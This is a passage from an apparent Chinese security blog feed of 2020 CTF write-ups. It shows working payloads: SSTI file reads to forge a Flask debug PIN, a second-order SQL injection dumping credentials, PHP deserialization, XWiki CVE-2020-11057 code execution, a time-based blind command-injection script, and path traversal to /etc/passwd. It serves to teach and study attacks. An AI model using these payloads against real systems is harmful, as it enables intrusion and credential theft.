class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="number">0x0242ac14000b</span></div><div class="line"><span class="number">2485378088971</span></div></pre></td></tr></table></figure><p>机器id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/etc/machine-id"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p>a8eb6cac33e701ae867269db5ce80e7f</p><p>新的machine-id要加上cgroup</p><p>于是读取/proc/self/cgroup并提取里面的id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/proc/self/cgroup"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p>52833efbb53e157ffd26a035d647ff1a1902fe648113ae6b0799af212f1966d0</p><p>拼接</p><p>a8eb6cac33e701ae867269db5ce80e7f52833efbb53e157ffd26a035d647ff1a1902fe648113ae6b0799af212f1966d0</p><p>脚本来自kingkk师傅 (<a href="https://xz.aliyun.com/t/2553）" target="_blank" rel="external">https://xz.aliyun.com/t/2553）</a></p><p>得到pin码</p><p>742-613-872</p><p>进入debug模式，执行任意python代码</p><p><img src="http://pic.c1imber.top/blog/20200903/vs7HlRFgsaJ1.png?imageslim" alt="mark"></p><p>(需要花时间研究总结一下ssti了，姿势太多)</p><h3 id="carefuleyes"><a href="#carefuleyes" class="headerlink" title="carefuleyes"></a>carefuleyes</h3><p>下载www.zip进行代码审计</p><p>发现一处二次注入</p><p>在rename.php,在出库时没有对数据库当中的$result[‘filename’]进行转义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$info = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$result['filename']&#125;'"</span>);</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200903/uyicsJ7uIJEC.png?imageslim" alt="mark"></p><p>可控输入：upload.php当中的<code>basename(pathinfo($_FILES[&quot;upfile&quot;][&#39;name&#39;]))[&#39;filename&#39;]</code>可以作为二次注入的注入点，这里转义入库，在出库时发生注入</p><p><img src="http://pic.c1imber.top/blog/20200903/XtdHAY1NRtd0.png?imageslim" alt="mark"></p><p>构造<code>filename=&quot;1&#39; and 1=2 union select 1,group_concat(username,0x3a,password),3,4,5 from user#.jpg&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20200903/kss5lpAg8bqO.png?imageslim" alt="mark"></p><p>接着访问rename，在old filename处传入<code>1&#39; and 1=2 union select 1,group_concat(username,0x3a,password),3,4,5 from user#</code>，触发二次注入</p><p><img src="http://pic.c1imber.top/blog/20200903/Q17Ycr0fdunw.png?imageslim" alt="mark"></p><p>获得数据库username和password为XM和qweqweqwe</p><p>upload.php存在<code>unserialize($_GET[&quot;data&quot;]);</code>，构造payload触发这里的反序列化，获取flag</p><p>payload</p><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> $method;</div><div class="line">    <span class="keyword">private</span> $args;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;method = $method;</div><div class="line">        <span class="keyword">$this</span>-&gt;args = $args;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$userinfo=<span class="keyword">array</span>(<span class="string">"XM"</span>,<span class="string">"qweqweqwe"</span>);</div><div class="line">$obj=<span class="keyword">new</span> XCTFGG(<span class="string">"login"</span>,$userinfo);</div><div class="line"><span class="keyword">echo</span> serialize($obj);</div></pre></td></tr></table></figure><p>result:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">6</span>:<span class="string">"XCTFGG"</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">"XCTFGGmethod"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;s:<span class="number">12</span>:<span class="string">"XCTFGGargs"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">2</span>:<span class="string">"XM"</span>;i:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">"qweqweqwe"</span>;&#125;&#125;</div></pre></td></tr></table></figure><p>因为这里类的属性是private，当中有不可见字符，需要修改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">6</span>:<span class="string">"XCTFGG"</span>:<span class="number">2</span>:&#123;S:<span class="number">14</span>:<span class="string">"\00XCTFGG\00method"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;S:<span class="number">12</span>:<span class="string">"\00XCTFGG\00args"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">2</span>:<span class="string">"XM"</span>;i:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">"qweqweqwe"</span>;&#125;&#125;</div></pre></td></tr></table></figure><p>最终构造上传数据包获取flag</p><pre><code>POST /upload.php?data=O%3A6%3A%22XCTFGG%22%3A2%3A%7BS%3A14%3A%22%5C00XCTFGG%5C00method%22%3Bs%3A5%3A%22login%22%3BS%3A12%3A%22%5C00XCTFGG%5C00args%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22XM%22%3Bi%3A1%3Bs%3A9%3A%22qweqweqwe%22%3B%7D%7D HTTP/1.1Host: 202.182.118.236User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------406950059833807422084179561779Content-Length: 228Origin: http://202.182.118.236Connection: closeReferer: http://202.182.118.236/Upgrade-Insecure-Requests: 1    -----------------------------406950059833807422084179561779Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;getflag.jpg&quot;Content-Type: image/jpeg    111-----------------------------406950059833807422084179561779--</code></pre><p><img src="http://pic.c1imber.top/blog/20200903/dBNtMGL6uSww.png?imageslim" alt="mark"></p><h3 id="XWiki"><a href="#XWiki" class="headerlink" title="XWiki"></a>XWiki</h3><p>CVE-2020-11057</p><p><a href="https://www.anquanke.com/vul/id/2024692" target="_blank" rel="external">https://www.anquanke.com/vul/id/2024692</a></p><p>根据漏洞描述，需要注册账号，然后在编辑个人仪表板的位置可以执行python或groovy代码</p><p>影响版本：</p><p>XWiki Platform 7.2版本至11.10.2版本</p><p>而目标为11.10.1</p><p><a href="http://119.3.111.133:1234/bin/edit/XWiki/Adm1nAdm1n?editor=inline&amp;category=dashboard" target="_blank" rel="external">http://119.3.111.133:1234/bin/edit/XWiki/Adm1nAdm1n?editor=inline&amp;category=dashboard</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">print</span> os.popen(<span class="string">'ls /'</span>).read()</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200903/9sU51BthkwiS.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">print</span> os.popen(<span class="string">'/readflag'</span>).read()</div></pre></td></tr></table></figure><p>直接执行这个二进制文件不行，一直显示比较数字大小</p><p><img src="http://pic.c1imber.top/blog/20200903/WRrOU06HsHW1.png?imageslim" alt="mark"></p><p>写个交互</p><p>readflag.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</div><div class="line">p=Popen(<span class="string">"./readflag"</span>,stdin=PIPE,stdout=PIPE,stderr=PIPE)</div><div class="line"><span class="keyword">print</span> p.stdout.readline()</div><div class="line"><span class="keyword">print</span> p.stdout.readline()</div><div class="line">res=<span class="string">""</span></div><div class="line">s=p.stdout.readline()</div><div class="line"><span class="keyword">while</span> <span class="string">"Which number is bigger?"</span> <span class="keyword">in</span> s:</div><div class="line">    <span class="keyword">print</span> s</div><div class="line">    num0=int(s.split(<span class="string">':'</span>)[<span class="number">0</span>].split(<span class="string">'?'</span>)[<span class="number">1</span>])</div><div class="line">    num1=int(s.split(<span class="string">':'</span>)[<span class="number">1</span>])</div><div class="line">    <span class="keyword">if</span> num0&gt;num1:</div><div class="line">        p.stdin.write(<span class="string">'0\n'</span>)</div><div class="line">        res+=<span class="string">'0'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        p.stdin.write(<span class="string">'1\n'</span>)</div><div class="line">        res+=<span class="string">'1'</span></div><div class="line">    s=p.stdout.readline()</div><div class="line"></div><div class="line"><span class="keyword">print</span> res</div></pre></td></tr></table></figure><p>得到一串二进制字符串</p><p><img src="http://pic.c1imber.top/blog/20200903/Ch5y7143T0vX.png?imageslim" alt="mark"></p><p>转为字符串就是flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">"01100111011000010110001101110100011001100111101101011000010101110110100101101011011010010101111101000011010101100100010101011111011101110110100101110100011010000110111101110101011101000101111101110000011001010111001001101101011010010111001101110011011010010110111101101110010111110111001101100011011100100110100101110000011101000110100101101110011001110101111101100101011110000110010101100011011101010111010001101001011011110110111000100001001000010010000101111101"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l=[s[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">8</span>)]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, <span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> l]])</div></pre></td></tr></table></figure><p><code>gactf{XWiki_CVE_without_permission_scripting_execution!!!}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;EZFLASK&quot;&gt;&lt;a href=&quot;#EZFLASK&quot; class=&quot;headerlink&quot; title=&quot;EZFLASK&quot;&gt;&lt;/a&gt;EZFLASK&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://124.70.206.91:10001/&quot; target=&quot;_bla
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020钓鱼城杯writeup</title>
    <link href="https://c1aysec.github.io/2020/08/28/2020%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFwriteup/"/>
    <id>https://c1aysec.github.io/2020/08/28/2020钓鱼城杯writeup/</id>
    <published>2020-08-28T06:46:21.992Z</published>
    <updated>2020-08-28T06:59:34.941Z</updated>
    
    <content type="html"><![CDATA[<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>php命令执行无回显、不出网、web目录不可写</p><p>通过<code>php -r &quot;sleep(5)&quot;</code>延时可以判断命令执行成功</p><p>获取/flag.txt</p><p><code>cmd=php -r &quot;if(strlen(file_get_contents(&#39;/flag.txt&#39;))==25){sleep(5);}&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20200828/n7eLgP9axiwK.png?imageslim" alt="mark"></p><p>时间盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">l=string.maketrans(<span class="string">""</span>,<span class="string">""</span>)[<span class="number">33</span>:<span class="number">127</span>]</div><div class="line"></div><div class="line">flag=<span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> l:</div><div class="line">        paramsPost = &#123;<span class="string">"cmd"</span>:<span class="string">"php -r \"if(substr((file_get_contents('/flag.txt')),%d,1)=='%s')&#123;sleep(5);&#125;\""</span>%(i,j)&#125;</div><div class="line">        headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Cache-Control"</span>:<span class="string">"no-cache"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Pragma"</span>:<span class="string">"no-cache"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">        start=time.time()</div><div class="line">        response = requests.post(<span class="string">"http://119.3.37.185/index.php"</span>, data=paramsPost, headers=headers)</div><div class="line">        end=time.time()</div><div class="line">        <span class="keyword">if</span> end-start &gt;=<span class="number">5</span>:</div><div class="line">            flag+=j</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200828/dIPIfK9dyRyG.png?imageslim" alt="mark"></p><p><code>flag{kijbvstsbsnsj1d9bc8}</code></p><h3 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a>easyseed</h3><p>index.bak泄露key和lock生成算法</p><p><img src="http://pic.c1imber.top/blog/20200828/PxlX4MDEwA8A.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</div><div class="line">    $hash = <span class="string">''</span>;</div><div class="line">    $max = strlen($chars) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</div><div class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Set-Cookie里给出了lock的值</p><p><img src="http://pic.c1imber.top/blog/20200828/5kUp2V0dPSta.png?imageslim" alt="mark"></p><p>根据lock值爆破seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">str1=<span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span></div><div class="line">str2=<span class="string">'vEUHaY'</span></div><div class="line">str3 = str1[::<span class="number">-1</span>]</div><div class="line">length = len(str2)</div><div class="line">res=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</div><div class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</div><div class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> res</div></pre></td></tr></table></figure><p>得到<code>21 21 0 51 30 30 0 51 46 46 0 51 33 33 0 51 0 0 0 51 50 50 0 51</code></p><p><code>./php_mt_seed 21 21 0 51 30 30 0 51 46 46 0 51 33 33 0 51 0 0 0 51 50 50 0 51</code></p><p>得到两个seed</p><p><img src="http://pic.c1imber.top/blog/20200828/Wgh5dVVX24cW.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">mt_srand(<span class="number">718225</span>);</div><div class="line"><span class="comment">//mt_srand(4007230629);</span></div><div class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</div><div class="line">    $hash = <span class="string">''</span>;</div><div class="line">    $max = strlen($chars) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</div><div class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">echo</span> $lock;</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">echo</span> $key;</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div></pre></td></tr></table></figure><p>选择正确的locl、key</p><p><code>lock=vEUHaY; key=nRtqGR8mtd9ZOPyI;</code></p><p>需要带上X-Forwarded-For: 127.0.0.1请求，才能获取flag==</p><p><img src="http://pic.c1imber.top/blog/20200828/21dIhUgOR2Kz.png?imageslim" alt="mark"></p><h3 id="zblog（完全是队友们做出来的）"><a href="#zblog（完全是队友们做出来的）" class="headerlink" title="zblog（完全是队友们做出来的）"></a>zblog（完全是队友们做出来的）</h3><p><img src="http://pic.c1imber.top/blog/20200828/Cs7pUhq9chBj.png?imageslim" alt="mark"></p><p>发现title存在任意文件读取</p><p><code>http://122.112.253.135/?title=/../../../../../../../etc/passwd</code></p><p><img src="http://pic.c1imber.top/blog/20200828/2HHUGR8gjkma.png?imageslim" alt="mark"></p><p>尝试读取/flag、/flag.txt均不行。读取/proc/self目录下的文件</p><p>从其他师傅博客里看到的fuzz字典：</p><pre><code>/proc/self/cmdline/proc/self/stat/proc/self/status/proc/self/environ/proc/verison/proc/cmdline/proc/self/cwd/proc/self/fd/0/proc/self/fd/1/proc/self/fd/2/proc/self/fd/3/proc/self/fd/4/proc/self/fd/5/proc/self/fd/6/proc/self/fd/7/proc/self/fd/8/proc/self/fd/9/proc/self/fd/10/proc/self/fd/11/proc/self/fd/12/proc/self/fd/13/proc/self/fd/14/proc/self/fd/15/proc/self/fd/16/proc/self/fd/17/proc/self/fd/18/proc/self/fd/19/proc/self/fd/20/proc/self/fd/21/proc/self/fd/22/proc/self/fd/23/proc/self/fd/24/proc/self/fd/25/proc/self/fd/26/proc/self/fd/27/proc/self/fd/28/proc/self/fd/29/proc/self/fd/30/proc/self/fd/31/proc/self/fd/32/proc/self/fd/33/proc/self/fd/34/proc/self/fd/35/proc/sched_debug/proc/mounts/proc/net/arp/proc/net/route/proc/net/tcp/proc/net/udp/proc/net/fib_trie/proc/version</code></pre><p>在/proc/self/cmdline发现当前运行的web jar包</p><p><img src="http://pic.c1imber.top/blog/20200828/ja16S1KRHrQC.png?imageslim" alt="mark"></p><p>/home/ctf/web/target/web-1.0-SNAPSHOT-jar-with-dependencies.jar</p><p>但是下载不下来</p><p>后来发现了关键的源码</p><p>/home/ctf/web/src/main/java/Blog.java</p><p><img src="http://pic.c1imber.top/blog/20200828/EpFBv1kxesTb.png?imageslim" alt="mark"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">static</span> spark.Spark.*;</div><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.Template;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.app.VelocityEngine;</div><div class="line"><span class="keyword">import</span> spark.template.velocity.VelocityTemplateEngine;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> java.io.StringWriter;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Blog</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String fname, String content)</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            FileWriter writer = <span class="keyword">new</span> FileWriter(fname, <span class="keyword">true</span>);</div><div class="line">            writer.write(content);</div><div class="line">            writer.close();</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arg)</span> </span>&#123;</div><div class="line">        staticFiles.location(<span class="string">"/public"</span>);</div><div class="line"></div><div class="line">        VelocityEngine velocityEngine = <span class="keyword">new</span> VelocityEngine();</div><div class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, <span class="string">"file"</span>);</div><div class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, <span class="string">"/"</span>);</div><div class="line">        velocityEngine.init();</div><div class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</div><div class="line"></div><div class="line">        get(<span class="string">"/"</span>, (request, response) -&gt; &#123;</div><div class="line">            request.session(<span class="keyword">true</span>);</div><div class="line">            String title = request.queryParams(<span class="string">"title"</span>);</div><div class="line">            <span class="keyword">if</span> (title != <span class="keyword">null</span>) &#123;</div><div class="line">                log(<span class="string">"/tmp/"</span> + request.session().id(), <span class="string">"Client IP: "</span> + request.ip() + <span class="string">" -&gt; File: "</span> + title + <span class="string">"\n"</span>);</div><div class="line">                Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/"</span> + title);</div><div class="line">                StringWriter sw = <span class="keyword">new</span> StringWriter();</div><div class="line">                template.merge(context, sw);</div><div class="line">                <span class="keyword">return</span> sw;</div><div class="line">            &#125;</div><div class="line">            Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/index"</span>);</div><div class="line">            StringWriter sw = <span class="keyword">new</span> StringWriter();</div><div class="line">            template.merge(context, sw);</div><div class="line">            <span class="keyword">return</span> sw;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>X-Forwarded-For头的位置存在ssti</p><p><img src="http://pic.c1imber.top/blog/20200828/1s9kmIDPRPrN.png?imageslim" alt="mark"></p><p>可以直接rce，直接用solr那个rce payload就可以成功</p><p><img src="http://pic.c1imber.top/blog/20200828/bj7HD4Yma9aM.png?imageslim" alt="mark"></p><p>获取flag</p><p><img src="http://pic.c1imber.top/blog/20200828/y95IWbp35WRC.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;easyweb&quot;&gt;&lt;a href=&quot;#easyweb&quot; class=&quot;headerlink&quot; title=&quot;easyweb&quot;&gt;&lt;/a&gt;easyweb&lt;/h3&gt;&lt;p&gt;php命令执行无回显、不出网、web目录不可写&lt;/p&gt;
&lt;p&gt;通过&lt;code&gt;php -r &amp;quo
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020强网杯writeup</title>
    <link href="https://c1aysec.github.io/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AFwriteup/"/>
    <id>https://c1aysec.github.io/2020/08/24/2020强网杯writeup/</id>
    <published>2020-08-24T08:28:12.524Z</published>
    <updated>2020-08-25T09:41:40.579Z</updated>
    
    <content type="html"><![CDATA[<p>没做出几道题，记录一下吧，周末两天的做题还是有收获的</p><h1 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h1><h3 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h3><p><img src="http://pic.c1imber.top/blog/20200824/7xfowRDckelN.png?imageslim" alt="mark"></p><p>题目直接给了源码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</div><div class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</div><div class="line">$username = $_GET[<span class="string">'username'</span>];</div><div class="line">$password = $_GET[<span class="string">'password'</span>];</div><div class="line">$player = <span class="keyword">new</span> player($username, $password);</div><div class="line">file_put_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]), write(serialize($player))); </div><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">'Welcome %s, your ip 